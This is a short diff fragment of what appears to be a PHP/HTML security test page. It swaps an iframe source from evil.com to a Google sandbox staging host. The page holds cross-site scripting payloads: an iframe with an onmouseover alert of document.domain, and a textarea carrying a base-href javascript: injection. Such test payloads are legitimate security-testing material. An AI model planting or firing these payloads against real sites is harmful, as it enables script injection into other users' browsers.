@@ -46,7 +46,7 @@ include 'log.php';
   src="https://www.google.com/chromesuggestions?t=0">
      <amp-img layout="fill" src="https://foo.com/foo.png" placeholder></amp-img>
 </amp-iframe>
-    <iframe onmouseover=alert(document.domain) src=http://evil.com></iframe> 
+    <iframe onmouseover=alert(document.domain) src=https://staging-taskassist-pa-googleapis.sandbox.google.com></iframe> 
 
 <textarea>xxxe.com/"><base href="javascript:\"><a href="/xss//alert(document.domain)"></textarea>
 
